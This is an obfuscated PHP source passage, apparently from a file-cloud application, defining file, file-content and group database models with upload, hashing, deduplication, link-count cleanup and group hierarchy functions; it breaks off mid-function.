<?php
 goto fŠŠòí†Àµ; B õ¹­˜ÏÉ: class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\154\145\137\143\157\156\164\x65\156\x74\163"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\x54\151\x6d\x65", "\164\151\155\x65", "\151\x6e\x73\145\162\x74", "\146\165\156\143\x74\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\x6c\x65"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\x6d\x65" => "\151\x6f\x5f\x66\151\x6c\145\137\155\145\x74\141", "\155\145\x74\x61\x46\x69\145\x6c\144" => "\146\151\154\145\x49\x44"); public function fileInfo($ø™éÔ) { $¿Á®ƒáş =& $_SERVER[çâ¥×ø³]; static $¾¾úŞè´ = array(); if (!isset($¾¾úŞè´[$ø™éÔ])) { $Œ½’¤· = $¿Á®ƒáş[1948]; $Â²ñø³Ò = Model($¿Á®ƒáş[512])->field($Œ½’¤·)->where(array($¿Á®ƒáş[510] => $ø™éÔ))->find(); $¾¾úŞè´[$ø™éÔ] = $Â²ñø³Ò; } return $¾¾úŞè´[$ø™éÔ]; } public function addFileByContent($×ùŒØ ¢ = '', $ë“¢ù»• = '') { $ç‰ë¸®¡ =& $_SERVER[çâ¥×ø³]; $¼¨‘Ğ¬ = TEMP_PATH . $ç‰ë¸®¡[1949]; if (!is_dir($¼¨‘Ğ¬)) { mk_dir($¼¨‘Ğ¬); } $•ıÏö°ó = $¼¨‘Ğ¬ . $ç‰ë¸®¡[1950] . rand_string(16); file_put_contents($•ıÏö°ó, $×ùŒØ ¢); $‰ªèñŞ› = $this->addFile($•ıÏö°ó, $ë“¢ù»•, !0); if (file_exists($•ıÏö°ó)) { @unlink($•ıÏö°ó); } return $‰ªèñŞ›; } public function createFileName($İãÃåÃ, $Õ³Ğûò = false, $¬‚éÎğ„ = false) { $¤×ì‡õ =& $_SERVER[çâ¥×ø³]; $ğÃó÷ÙÛ = IO::init($¤×ì‡õ[8]); $Ìá±ö¹± = $this->makeFilePath($İãÃåÃ, $ğÃó÷ÙÛ, $Õ³Ğûò, $¬‚éÎğ„); $£öÄÑŠé = $ğÃó÷ÙÛ->pathFather($Ìá±ö¹±); static $ç¯ùïó = false; $Í±›ïºÔ = $¤×ì‡õ[1951] . md5($£öÄÑŠé); if (!$ç¯ùïó && !Cache::get($Í±›ïºÔ)) { $ç¯ùïó = !0; $Ã¤±¯Ù÷ = IO::mkdir($£öÄÑŠé); if (!IO::exist($Ã¤±¯Ù÷ . $¤×ì‡õ[846])) { IO::mkfile($Ã¤±¯Ù÷ . $¤×ì‡õ[846]); } Cache::set($Í±›ïºÔ, 1, 3600 * 2); } return $Ìá±ö¹±; } public function makeFilePath($Íªöü, $ö²±áşÈ, $ Äšø‹± = false, $òÅÛ˜ªÜ = false) { $°Ö–Ğçä =& $_SERVER[çâ¥×ø³]; $ÉÅòÄı = Model($°Ö–Ğçä[819])->get($°Ö–Ğçä[1952]); $¹¾×³» = KodIO::defaultIO() . date($°Ö–Ğçä[1953]); $ì³õ¨Š = $¹¾×³» . rand_string(5) . short_id(100); $Íªöü = str_replace($°Ö–Ğçä[8], $°Ö–Ğçä[11], KodIO::clear($Íªöü)); $•¼ûĞÓ™ = $ö²±áşÈ->ext($Íªöü); if (!$Íªöü) { $ÉÅòÄı = $°Ö–Ğçä[1954]; } switch ($ÉÅòÄı) { case $°Ö–Ğçä[1955]: $ì³õ¨Š = $ì³õ¨Š . $°Ö–Ğçä[10] . $ö²±áşÈ->ext($Íªöü); if ($•¼ûĞÓ™ == $°Ö–Ğçä[1892]) { $ì³õ¨Š .= $°Ö–Ğçä[1259]; } break; case $°Ö–Ğçä[1956]: $Ã§¢à¼´ = Model($°Ö–Ğçä[819])->get($°Ö–Ğçä[820]); $¸Õª÷ô = substr(md5($°Ö–Ğçä[821] . $Ã§¢à¼´ . date($°Ö–Ğçä[797])), 0, 8); $ÂàÒ¼Èà = KodIO::defaultDriver(); $¹¾×³» = $°Ö–Ğçä[1290] . $ÂàÒ¼Èà[$°Ö–Ğçä[443]] . $°Ö–Ğçä[452] . date($°Ö–Ğçä[1957]) . $¸Õª÷ô . $°Ö–Ğçä[8]; if ($•¼ûĞÓ™ == $°Ö–Ğçä[1892]) { $Íªöü .= $°Ö–Ğçä[1259]; } $”áÈ“Ô = $°Ö–Ğçä[1958] . $¹¾×³» . $Íªöü; CacheLock::lock($”áÈ“Ô); $ì³õ¨Š = $¹¾×³» . $Íªöü; if (IO::exist($¹¾×³» . $Íªöü)) { $àÓİ½Èİ = substr($Íªöü, 0, strlen($Íªöü) - strlen($•¼ûĞÓ™)); $ƒ¾Áƒ÷ = $òÅÛ˜ªÜ ? substr($òÅÛ˜ªÜ, 0, 5) : ($ Äšø‹± ? substr($ Äšø‹±, 0, 5) : rand_string(5)); $ì³õ¨Š = $¹¾×³» . $àÓİ½Èİ . $ƒ¾Áƒ÷ . $°Ö–Ğçä[10] . $•¼ûĞÓ™; } if (IO::isTypeObject($ì³õ¨Š) && !IO::isUploadServer($ì³õ¨Š)) { if (IO::exist($ì³õ¨Š)) { return $ì³õ¨Š; } $Åâ‘äøì = IO::setContent($ì³õ¨Š, $°Ö–Ğçä[12]); if (!$Åâ‘äøì) { show_json($°Ö–Ğçä[1959], !1); } } CacheLock::unlock($”áÈ“Ô); break; case $°Ö–Ğçä[1954]: break; default: break; } return $ì³õ¨Š; } public function addFileByRemote($ëñó†ğğ, $ùóíËûÔ, $ÒÕ‹ßÀ½ = array()) { $Ãæ×È¯ì =& $_SERVER[çâ¥×ø³]; if (!IO::exist($ëñó†ğğ)) { return !1; } $õ¸Ù“×§ = $ÒÕ‹ßÀ½[$Ãæ×È¯ì[641]] ? $ÒÕ‹ßÀ½[$Ãæ×È¯ì[641]] : $Ãæ×È¯ì[12]; $íà–ó®é = IO::hashMd5($ëñó†ğğ, $õ¸Ù“×§); $†çÁšŒ = KodIO::defaultDriver(); $Ğ“øË‘ = array($Ãæ×È¯ì[585] => IO::size($ëñó†ğğ), $Ãæ×È¯ì[1960] => 1, $Ãæ×È¯ì[462] => $ùóíËûÔ, $Ãæ×È¯ì[857] => $†çÁšŒ[$Ãæ×È¯ì[443]], $Ãæ×È¯ì[463] => $ëñó†ğğ, $Ãæ×È¯ì[1961] => $ÒÕ‹ßÀ½[$Ãæ×È¯ì[640]] ? $ÒÕ‹ßÀ½[$Ãæ×È¯ì[640]] : IO::hashSimple($ëñó†ğğ), $Ãæ×È¯ì[1962] => $íà–ó®é ? $íà–ó®é : $õ¸Ù“×§); if ($·’Œ±‹á = $this->addFileCheckExist($Ğ“øË‘[$Ãæ×È¯ì[640]], $Ğ“øË‘[$Ãæ×È¯ì[641]], $Ğ“øË‘[$Ãæ×È¯ì[76]])) { return $·’Œ±‹á; } return $this->addFileData($Ğ“øË‘); } private function addFileData($†Ğ Îúî) { $ğ×âìÕˆ =& $_SERVER[çâ¥×ø³]; if (!$†Ğ Îúî) { return !1; } $†Ğ Îúî[$ğ×âìÕˆ[76]] = intval($†Ğ Îúî[$ğ×âìÕˆ[76]]); if (!$†Ğ Îúî[$ğ×âìÕˆ[76]] && strlen($†Ğ Îúî[$ğ×âìÕˆ[640]]) > 32) { $†Ğ Îúî[$ğ×âìÕˆ[76]] = intval(substr($†Ğ Îúî[$ğ×âìÕˆ[640]], 32)); } $Ò“ì®î• = $this->add($†Ğ Îúî); return $this->find($Ò“ì®î•); } public function addFile($ĞÂ…ğˆ£, $Ñèñ¥, $¾²ñè“İ = false) { $­Ñö·ò£ =& $_SERVER[çâ¥×ø³]; $¨¶“¤á = IO::hashSimple($ĞÂ…ğˆ£); $É€İ×û½ = IO::size($ĞÂ…ğˆ£); $´ıë¹¯ = $É€İ×û½ <= 1024 * 1024 * 10 ? IO::hashMd5($ĞÂ…ğˆ£) : $­Ñö·ò£[12]; $ŠŒŞ·Ï = $­Ñö·ò£[1963] . $¨¶“¤á; CacheLock::lock($ŠŒŞ·Ï); if ($´ıë¹¯ && $¨¶“¤á) { $¢ôÑÁ€¡ = $this->addFileCheckExist($¨¶“¤á, $´ıë¹¯, $É€İ×û½); if ($¢ôÑÁ€¡) { CacheLock::unlock($ŠŒŞ·Ï); return $¢ôÑÁ€¡; } } $•üƒ Á = $this->addFileMake($ĞÂ…ğˆ£, $É€İ×û½, $¨¶“¤á, $´ıë¹¯, $Ñèñ¥, $¾²ñè“İ); $ßçşÜÒÔ = $this->addFileData($•üƒ Á); CacheLock::unlock($ŠŒŞ·Ï); if (!$´ıë¹¯ && $ßçşÜÒÔ) { $this->fileMd5Check($ßçşÜÒÔ); } return $ßçşÜÒÔ; } private function fileMd5Check($Õ‚ÏÍ²€) { $ıŸØÏÚ® =& $_SERVER[çâ¥×ø³]; $õ×äÃé = array($Õ‚ÏÍ²€[$ıŸØÏÚ®[509]], $Õ‚ÏÍ²€[$ıŸØÏÚ®[84]]); $ÚªÎïî× = $ıŸØÏÚ®[1964] . $Õ‚ÏÍ²€[$ıŸØÏÚ®[84]]; $ÎªÄ˜ß‡ = $ıŸØÏÚ®[1965] . $Õ‚ÏÍ²€[$ıŸØÏÚ®[509]]; $¦ä„¦ıÚ = TaskQueue::add($ıŸØÏÚ®[1966], $õ×äÃé, $ÚªÎïî×, $ÎªÄ˜ß‡); if (!$¦ä„¦ıÚ) { $this->fileMd5Set($Õ‚ÏÍ²€[$ıŸØÏÚ®[509]], $Õ‚ÏÍ²€[$ıŸØÏÚ®[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($èâ“Şª¡, $šçË¨’) { $Ï­ëÎ£ø =& $_SERVER[çâ¥×ø³]; $·‹ÃÆ¼ç = $this->find($èâ“Şª¡); if (!$·‹ÃÆ¼ç || $·‹ÃÆ¼ç[$Ï­ëÎ£ø[641]]) { return; } $ÚÖòØÛ = IO::hashMd5($šçË¨’); if (!$ÚÖòØÛ) { return $Ï­ëÎ£ø[12]; } $this->where(array($Ï­ëÎ£ø[509] => $èâ“Şª¡))->save(array($Ï­ëÎ£ø[641] => $ÚÖòØÛ)); } public function addFileMake($ÁÍÔè›, $ñÃöà, $…ìØ­¥æ, $•šú¥´, $«³•Ûª, $ø×²ŸêÓ) { $ì‘„¤° =& $_SERVER[çâ¥×ø³]; $·×ğ†Şé = $this->createFileName($«³•Ûª, $…ìØ­¥æ, $•šú¥´); $‚™ì˜³ã = get_path_father($·×ğ†Şé); $öÂ¢· = get_path_this($·×ğ†Şé); if ($ø×²ŸêÓ) { $ ‡˜Ú»š = IO::move($ÁÍÔè›, $‚™ì˜³ã, !1, $öÂ¢·); } else { $ ‡˜Ú»š = IO::copy($ÁÍÔè›, $‚™ì˜³ã, !1, $öÂ¢·); } if (!$ ‡˜Ú»š) { return !1; } $…øİãÛ† = KodIO::defaultDriver(); $Æğû‹ƒ¶ = array($ì‘„¤°[585] => $ñÃöà, $ì‘„¤°[1960] => 1, $ì‘„¤°[462] => $«³•Ûª, $ì‘„¤°[857] => $…øİãÛ†[$ì‘„¤°[443]], $ì‘„¤°[463] => $·×ğ†Şé, $ì‘„¤°[1961] => $…ìØ­¥æ, $ì‘„¤°[1962] => $•šú¥´); return $Æğû‹ƒ¶; } public function addFileCheckExist($ÙÂŒãÆÇ, $˜²Âêêù, $¿ÃÚøöë) { $§†å÷Íë =& $_SERVER[çâ¥×ø³]; $×‰ûâÍ = $this->findByHash($ÙÂŒãÆÇ, $˜²Âêêù); if (!$×‰ûâÍ) { return !1; } $íÛ‚–¦ = array($§†å÷Íë[1960] => intval($×‰ûâÍ[$§†å÷Íë[1967]]) + 1, $§†å÷Íë[585] => $¿ÃÚøöë); $this->where(array($§†å÷Íë[510] => $×‰ûâÍ[$§†å÷Íë[509]]))->save($íÛ‚–¦); return $×‰ûâÍ; } public function remove($šÜì»š) { $this->linkCountChange($šÜì»š, !1); $this->clearEmpty(); return !0; } public function linkAdd($¢Ç¾“) { $this->linkCountChange($¢Ç¾“, !0); } public function linkCountChange($‡ÒÊª®, $ƒÕ¬ä±) { $ “´úŠ =& $_SERVER[çâ¥×ø³]; if (!$‡ÒÊª®) { return; } if (!is_array($‡ÒÊª®)) { $‡ÒÊª® = array($‡ÒÊª®); } $§ôËö”Ş = array(); foreach ($‡ÒÊª® as $¢ºå¨ßİ) { $”éÉ¬‹¶ = $¢ºå¨ßİ . $ “´úŠ[12]; if (!$§ôËö”Ş[$”éÉ¬‹¶]) { $§ôËö”Ş[$”éÉ¬‹¶] = 0; } $§ôËö”Ş[$”éÉ¬‹¶]++; } $Ãºâ¾¼ = array(); foreach ($§ôËö”Ş as $¢ºå¨ßİ => $¯êò¡¯²) { $”éÉ¬‹¶ = $¯êò¡¯² . $ “´úŠ[12]; if (!$Ãºâ¾¼[$”éÉ¬‹¶]) { $Ãºâ¾¼[$”éÉ¬‹¶] = array(); } $Ãºâ¾¼[$”éÉ¬‹¶][] = $¢ºå¨ßİ; } foreach ($Ãºâ¾¼ as $¯êò¡¯² => $Öº“òÙ) { if (!$Öº“òÙ) { continue; } $¯êò¡¯² = $ƒÕ¬ä± ? $¯êò¡¯² : -intval($¯êò¡¯²); $ÆÍµ½œí = array($ “´úŠ[509] => array($ “´úŠ[7], $Öº“òÙ)); if ($¯êò¡¯² < 0) { $ÆÍµ½œí[$ “´úŠ[1967]] = array($ “´úŠ[1068], abs($¯êò¡¯²)); } $this->where($ÆÍµ½œí)->setAdd($ “´úŠ[1967], $¯êò¡¯²); } } public function findByHash($¡—ÙÉÉº, $åïëĞ¬Ò = false) { $îÂ€š€÷ =& $_SERVER[çâ¥×ø³]; if (!$¡—ÙÉÉº && !$åïëĞ¬Ò) { return !1; } $’åÈèŠ = array($îÂ€š€÷[1961] => $¡—ÙÉÉº); if ($åïëĞ¬Ò) { $’åÈèŠ = array($îÂ€š€÷[1962] => $åïëĞ¬Ò); } return $this->order($îÂ€š€÷[1968])->where($’åÈèŠ)->find(); } public function clearEmpty($Ğ³„óò¥ = 0) { $­´“Ğéê =& $_SERVER[çâ¥×ø³]; $îîã‚—• = time() - 3600 * 24 * $Ğ³„óò¥; $¨€€ç·± = $­´“Ğéê[1969] . $îîã‚—•; $†”ÃÙˆ† = $this->where($¨€€ç·±)->select(); if (!$†”ÃÙˆ†) { return; } $à”üÂâî = new Task($­´“Ğéê[1970], $­´“Ğéê[12], count($†”ÃÙˆ†)); foreach ($†”ÃÙˆ† as $¯õ¹ğä) { $à”üÂâî->update(1); $this->resetFile($¯õ¹ğä); } $à”üÂâî->end(); } public function resetFile($ÕÏë²¡) { $ÛËãİ½õ =& $_SERVER[çâ¥×ø³]; $†±—óğ = array($ÛËãİ½õ[510] => $ÕÏë²¡[$ÛËãİ½õ[509]]); $ºè¿¼ÜØ = Model($ÛËãİ½õ[1385])->where($†±—óğ)->count(); $Í±©ÎŒ¦ = Model($ÛËãİ½õ[1971])->where($†±—óğ)->count(); $Ó¡€‡Üô = intval($ºè¿¼ÜØ) + intval($Í±©ÎŒ¦); if ($Ó¡€‡Üô == 0) { IO::remove($ÕÏë²¡[$ÛËãİ½õ[84]]); Model($ÛËãİ½õ[1972])->delete($ÕÏë²¡[$ÛËãİ½õ[509]]); $this->where($†±—óğ)->delete(); $this->metaSet($ÕÏë²¡[$ÛËãİ½õ[509]], null, null); return; } if ($ÕÏë²¡[$ÛËãİ½õ[1967]] != $Ó¡€‡Üô) { $this->where($†±—óğ)->save(array($ÛËãİ½õ[1960] => $Ó¡€‡Üô)); } } public function storageInfo($àéÊ†şõ = false) { $«ŒĞ¹ñç =& $_SERVER[çâ¥×ø³]; $ÙÊ»ê»’ = $this->count() + 0.0; $¸š“¹ñ½ = 0; $×Û¶°áÖ = 1; $ôÙ˜à‹· = 0; $÷µ¡¶Ó = 5000; for ($•òòšş‡ = 0; $•òòšş‡ < $ÙÊ»ê»’; $•òòšş‡ = $•òòšş‡ + $÷µ¡¶Ó) { $ÁŒÛé©Ÿ = $this->limit($•òòšş‡, $•òòšş‡ + $÷µ¡¶Ó)->select(); foreach ($ÁŒÛé©Ÿ as $úÌõ¾ˆ) { $×Û¶°áÖ += $úÌõ¾ˆ[$«ŒĞ¹ñç[76]] * $úÌõ¾ˆ[$«ŒĞ¹ñç[1967]]; $¸š“¹ñ½ += $úÌõ¾ˆ[$«ŒĞ¹ñç[76]] * ($úÌõ¾ˆ[$«ŒĞ¹ñç[1967]] - 1); $ôÙ˜à‹· += $úÌõ¾ˆ[$«ŒĞ¹ñç[1967]]; } } $Ò‰¸ïã„ = array($«ŒĞ¹ñç[1973] => $×Û¶°áÖ, $«ŒĞ¹ñç[1974] => $¸š“¹ñ½, $«ŒĞ¹ñç[1975] => $¸š“¹ñ½ / $×Û¶°áÖ, $«ŒĞ¹ñç[80] => $ÙÊ»ê»’, $«ŒĞ¹ñç[1976] => $ôÙ˜à‹·); return $Ò‰¸ïã„; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\160"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\155\145" => "\x67\x72\x6f\165\x70\137\155\x65\164\141", "\x6d\x65\x74\141\106\151\x65\x6c\x64" => "\x67\x72\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($ÓÀüÏî) { $õÓ¦Ùë¤ =& $_SERVER[çâ¥×ø³]; return array($õÓ¦Ùë¤[1977] => array($ÓÀüÏî[0], $õÓ¦Ùë¤[1978]), $õÓ¦Ùë¤[1979] => array($ÓÀüÏî[0], $õÓ¦Ùë¤[1980])); } protected function getInfo($¤Èßğ•, $ğ®íçå„ = false) { $¸¤Û«Ú¶ = $this->getInfoSimple($¤Èßğ•); if (!$¸¤Û«Ú¶) { return !1; } if ($ğ®íçå„) { return $this->_listDataApplyItem($¸¤Û«Ú¶); } return $this->cacheFunctionGet($_SERVER[çâ¥×ø³][1981], $¤Èßğ•); } protected function getInfoSimple($˜‡Ëß½Œ, $óŠ˜î¶‘ = false) { $·ğş§àê =& $_SERVER[çâ¥×ø³]; if ($óŠ˜î¶‘) { $œÓ¯º– = array($·ğş§àê[1899] => intval($˜‡Ëß½Œ)); $­—®„‹à = $this->where($œÓ¯º–)->find(); return is_array($­—®„‹à) ? $­—®„‹à : array(); } return $this->cacheFunctionGet($·ğş§àê[1982], $˜‡Ëß½Œ); } protected function groupAdd($ŞÀ¥ã¶”) { $öªä‰é÷ =& $_SERVER[çâ¥×ø³]; if (!$ŞÀ¥ã¶”[$öªä‰é÷[180]] && isset($ŞÀ¥ã¶”[$öªä‰é÷[1899]]) && $ŞÀ¥ã¶”[$öªä‰é÷[1899]] == 1) { if ($•æ×†Îú = $this->getInfoSimple($ŞÀ¥ã¶”[$öªä‰é÷[1899]], !0)) { return $ŞÀ¥ã¶”[$öªä‰é÷[1899]]; } } else { $•æ×†Îú = $this->getInfoSimple($ŞÀ¥ã¶”[$öªä‰é÷[180]]); if (!$•æ×†Îú) { return !1; } } $’Áà¾Ë° = $öªä‰é÷[563]; if ($•æ×†Îú[$öªä‰é÷[553]]) { $’Áà¾Ë° = $•æ×†Îú[$öªä‰é÷[553]] . $•æ×†Îú[$öªä‰é÷[1899]] . $öªä‰é÷[50]; } $‡îíäÎÍ = array($öªä‰é÷[462] => $this->groupNameAuto($ŞÀ¥ã¶”[$öªä‰é÷[180]], $ŞÀ¥ã¶”[$öªä‰é÷[32]]), $öªä‰é÷[445] => $ŞÀ¥ã¶”[$öªä‰é÷[180]], $öªä‰é÷[620] => $’Áà¾Ë°, $öªä‰é÷[1983] => $ŞÀ¥ã¶”[$öªä‰é÷[1886]], $öªä‰é÷[1984] => 0, $öªä‰é÷[1903] => 0); if (isset($ŞÀ¥ã¶”[$öªä‰é÷[1923]])) { $‡îíäÎÍ[$öªä‰é÷[1923]] = $ŞÀ¥ã¶”[$öªä‰é÷[1923]]; } else { $©¿ÄÄ·Ï = $this->max($öªä‰é÷[1923]); if (!$©¿ÄÄ·Ï) { $©¿ÄÄ·Ï = 0; } $‡îíäÎÍ[$öªä‰é÷[1923]] = $©¿ÄÄ·Ï + 1; } if (!empty($ŞÀ¥ã¶”[$öªä‰é÷[1899]])) { $‡îíäÎÍ[$öªä‰é÷[1899]] = $ŞÀ¥ã¶”[$öªä‰é÷[1899]]; } $üç¿åö† = $this->add($‡îíäÎÍ); $this->setNamePinyin($üç¿åö†, $‡îíäÎÍ[$öªä‰é÷[32]]); if (isset($ŞÀ¥ã¶”[$öªä‰é÷[1985]])) { $this->metaSet($üç¿åö†, array($öªä‰é÷[1985] => $ŞÀ¥ã¶”[$öªä‰é÷[1985]], $öªä‰é÷[1986] => $ŞÀ¥ã¶”[$öªä‰é÷[1986]])); unset($ŞÀ¥ã¶”[$öªä‰é÷[1985]]); unset($ŞÀ¥ã¶”[$öªä‰é÷[1986]]); } Model($öªä‰é÷[1385])->groupRootAdd($üç¿åö†); $this->_clearCache($ŞÀ¥ã¶”[$öªä‰é÷[180]]); return $üç¿åö†; } protected function groupEdit($§š¹åÆ, $ƒÒÚ“Ë‘) { $›ö˜ÅÌ =& $_SERVER[çâ¥×ø³]; $ßûÖñ÷° = $this->getInfoSimple($§š¹åÆ); if (!$ßûÖñ÷°) { return !1; } if (!empty($ƒÒÚ“Ë‘[$›ö˜ÅÌ[180]])) { $Å¥øğ¤‘ = $this->getInfoSimple($ƒÒÚ“Ë‘[$›ö˜ÅÌ[180]]); if (!$Å¥øğ¤‘) { return !1; } if ($ßûÖñ÷°[$›ö˜ÅÌ[1899]] == $Å¥øğ¤‘[$›ö˜ÅÌ[1899]]) { return !1; } if ($ƒÒÚ“Ë‘[$›ö˜ÅÌ[180]] != $ßûÖñ÷°[$›ö˜ÅÌ[180]]) { if ($Å¥øğ¤‘[$›ö˜ÅÌ[553]] !== $ßûÖñ÷°[$›ö˜ÅÌ[553]] && strpos($Å¥øğ¤‘[$›ö˜ÅÌ[553]], $ßûÖñ÷°[$›ö˜ÅÌ[553]] . $ßûÖñ÷°[$›ö˜ÅÌ[1899]] . $›ö˜ÅÌ[50]) === 0) { return !1; } $ƒÒÚ“Ë‘[$›ö˜ÅÌ[620]] = $Å¥øğ¤‘[$›ö˜ÅÌ[553]] . $ƒÒÚ“Ë‘[$›ö˜ÅÌ[180]] . $›ö˜ÅÌ[50]; $this->_changeChildLevel($ßûÖñ÷°, $Å¥øğ¤‘); $this->_clearCache($Å¥øğ¤‘[$›ö˜ÅÌ[1899]]); $this->_clearCache($ßûÖñ÷°[$›ö˜ÅÌ[180]]); } } if (isset($ƒÒÚ“Ë‘[$›ö˜ÅÌ[32]])) { $this->setNamePinyin($§š¹åÆ, $ƒÒÚ“Ë‘[$›ö˜ÅÌ[32]]); } if (isset($ƒÒÚ“Ë‘[$›ö˜ÅÌ[1985]])) { $this->metaSet($§š¹åÆ, array($›ö˜ÅÌ[1985] => $ƒÒÚ“Ë‘[$›ö˜ÅÌ[1985]], $›ö˜ÅÌ[1986] => $ƒÒÚ“Ë‘[$›ö˜ÅÌ[1986]])); unset($ƒÒÚ“Ë‘[$›ö˜ÅÌ[1985]]); unset($ƒÒÚ“Ë‘[$›ö˜ÅÌ[1986]]); } $this->_clearChildrenCache($ßûÖñ÷°); return $this->where(array($›ö˜ÅÌ[1987] => $§š¹åÆ))->save($ƒÒÚ“Ë‘); } private function _clearChildrenCache($¦ÁÓ¢ÌÔ) { $šÂûæ®– =& $_SERVER[çâ¥×ø³]; $¨‰ÃÏ»¸ = array($šÂûæ®–[620] => array($šÂûæ®–[580], $¦ÁÓ¢ÌÔ[$šÂûæ®–[553]] . $¦ÁÓ¢ÌÔ[$šÂûæ®–[1899]] . $šÂûæ®–[581])); $­ûåÀ‰Ò = $this->field($šÂûæ®–[1899])->where($¨‰ÃÏ»¸)->select(); foreach ($­ûåÀ‰Ò as $ÍËÒ­Çè) { $this->_clearCache($ÍËÒ­Çè[$šÂûæ®–[1899]]); } } private function _clearCache($—ãÑÓ ) { $ûĞŸÔò´ =& $_SERVER[çâ¥×ø³]; $this->cacheFunctionClear($ûĞŸÔò´[1981], $—ãÑÓ ); $this->cacheFunctionClear($ûĞŸÔò´[1982], $—ãÑÓ ); } private function _changeChildLevel($®Ç‘º€, $‹÷¿‹­Ÿ, $ŒÚˆÓşÌ = false) { $½©ñ…­½ =& $_SERVER[çâ¥×ø³]; $ÇÈ­› = $®Ç‘º€[$½©ñ…­½[553]] . $®Ç‘º€[$½©ñ…­½[1899]] . $½©ñ…­½[50]; $İÓñ‹ïÕ = $‹÷¿‹­Ÿ[$½©ñ…­½[553]] . $‹÷¿‹­Ÿ[$½©ñ…­½[1899]] . $½©ñ…­½[50] . $®Ç‘º€[$½©ñ…­½[1899]] . $½©ñ…­½[50]; if ($ŒÚˆÓşÌ) { $İÓñ‹ïÕ = $‹÷¿‹­Ÿ[$½©ñ…­½[553]] . $‹÷¿‹­Ÿ[$½©ñ…­½[1899]] . $½©ñ…­½[50]; } $¥™Óí« = array($½©ñ…­½[620] => array($½©ñ…­½[580], $®Ç‘º€[$½©ñ…­½[553]] . $®Ç‘º€[$½©ñ…­½[1899]] . $½©ñ…­½[581])); $¸ƒÈıÂ† = array($½©ñ…­½[620] => array($½©ñ…­½[629], "\162\145\x70\154\141\143\x65\50\160\x61\162\145\x6e\x74\x4c\x65\166\x65\154\x2c\47{$ÇÈ­›}\47\54\47{$İÓñ‹ïÕ}\x27\51")); $this->_clearChildrenCache($®Ç‘º€); $this->where($¥™Óí«)->data($¸ƒÈıÂ†)->save(); } public function setNamePinyin($©ÔÅ¿†Ÿ, $¬âñõ¶’ = false) { $û¹Ê›½ =& $_SERVER[çâ¥×ø³]; if (!$¬âñõ¶’) { $—ÔÉØ› = $this->getInfoSimple($©ÔÅ¿†Ÿ); $¬âñõ¶’ = $—ÔÉØ›[$û¹Ê›½[32]]; } if (!Input::check($¬âñõ¶’, $û¹Ê›½[623])) { $this->metaSet($©ÔÅ¿†Ÿ, $û¹Ê›½[506], null); $this->metaSet($©ÔÅ¿†Ÿ, $û¹Ê›½[505], null); return; } $òÙÌ‡ì = array($û¹Ê›½[506] => str_replace($û¹Ê›½[53], $û¹Ê›½[12], Pinyin::get($¬âñõ¶’)), $û¹Ê›½[505] => Pinyin::get($¬âñõ¶’, $û¹Ê›½[624])); $this->metaSet($©ÔÅ¿†Ÿ, $òÙÌ‡ì); } protected function groupStatus($Â¿İµâè, $È¼ÄÑŞ´) { $¯‹÷×¥² =& $_SERVER[çâ¥×ø³]; $ä·ßù‰µ = $this->getInfoSimple($Â¿İµâè); if (!$ä·ßù‰µ) { return !1; } if ($È¼ÄÑŞ´ == $¯‹÷×¥²[88]) { $×½²îÔ = $this->parentLevelArray($ä·ßù‰µ[$¯‹÷×¥²[553]]); } else { $îø¼ø„ƒ = array($¯‹÷×¥²[620] => array($¯‹÷×¥²[580], $ä·ßù‰µ[$¯‹÷×¥²[553]] . $ä·ßù‰µ[$¯‹÷×¥²[1899]] . $¯‹÷×¥²[581])); $×½²îÔ = $this->where($îø¼ø„ƒ)->field($¯‹÷×¥²[1899])->select(); $×½²îÔ = array_to_keyvalue($×½²îÔ, $¯‹÷×¥²[12], $¯‹÷×¥²[1899]); } $×½²îÔ[] = $ä·ßù‰µ[$¯‹÷×¥²[1899]]; $£±ÔÍê­ = array(); foreach ($×½²îÔ as $Â¿İµâè) { $£±ÔÍê­[] = array($¯‹÷×¥²[1899] => $Â¿İµâè, $¯‹÷×¥²[94] => $¯‹÷×¥²[799], $¯‹÷×¥²[418] => $È¼ÄÑŞ´); $this->_clearCache($Â¿İµâè); } return Model($¯‹÷×¥²[1988])->addAll($£±ÔÍê­, array(), !0); } protected function groupRemove($Ø¿¹¼ı¡, $Î´¡÷ı = false) { $·‘Â–”Ñ =& $_SERVER[çâ¥×ø³]; $šıÜ´ø = array($·‘Â–”Ñ[1899] => $Ø¿¹¼ı¡); $è´€ªÉ = $this->where($šıÜ´ø)->find(); if (!$è´€ªÉ || $è´€ªÉ[$·‘Â–”Ñ[180]] == 0) { return !1; } if (!$Î´¡÷ı) { $§Ôôšå“ = $this->getInfoSimple($è´€ªÉ[$·‘Â–”Ñ[180]]); $this->_changeChildLevel($è´€ªÉ, $§Ôôšå“, !0); $this->where(array($·‘Â–”Ñ[180] => $Ø¿¹¼ı¡))->save(array($·‘Â–”Ñ[180] => $è´€ªÉ[$·‘Â–”Ñ[180]])); $this->_clearCache($§Ôôšå“[$·‘Â–”Ñ[1899]]); } Model($·‘Â–”Ñ[1988])->where($šıÜ´ø)->delete(); Model($·‘Â–”Ñ[1989])->where($šıÜ´ø)->delete(); Model($·‘Â–”Ñ[874])->groupRootRemove($Ø¿¹¼ı¡); $this->_clearCache($è´€ªÉ[$·‘Â–”Ñ[180]]); return $this->where($šıÜ´ø)->delete(); } protected function groupSort($¤ïó…òë) { $¹Ñ»¹ˆË =& $_SERVER[çâ¥×ø³]; $ı³”ğ”¦ = array(); foreach ($¤ïó…òë as $»®Å®Ò => $Â”áİ») { $ı³”ğ”¦[] = array($¹Ñ»¹ˆË[1899], $Â”áİ», $¹Ñ»¹ˆË[1923], $»®Å®Ò + 1); } $this->saveAll($ı³”ğ”¦); } public function listData() { $âÀ×ï× = $this->_makeOrder()->selectPage(50); $this->_listDataApply($âÀ×ï×[$_SERVER[çâ¥×ø³][413]]); return $âÀ×ï×; } private function _makeOrder($Çí©ƒ€ = '') { $ß¬û™¡Ş =& $_SERVER[çâ¥×ø³]; $†¸Ä®ÉØ = array($ß¬û™¡Ş[1899], $ß¬û™¡Ş[32], $ß¬û™¡Ş[1888], $ß¬û™¡Ş[215]); $¿• â¾ = array($ß¬û™¡Ş[491] => $ß¬û™¡Ş[492], $ß¬û™¡Ş[493] => 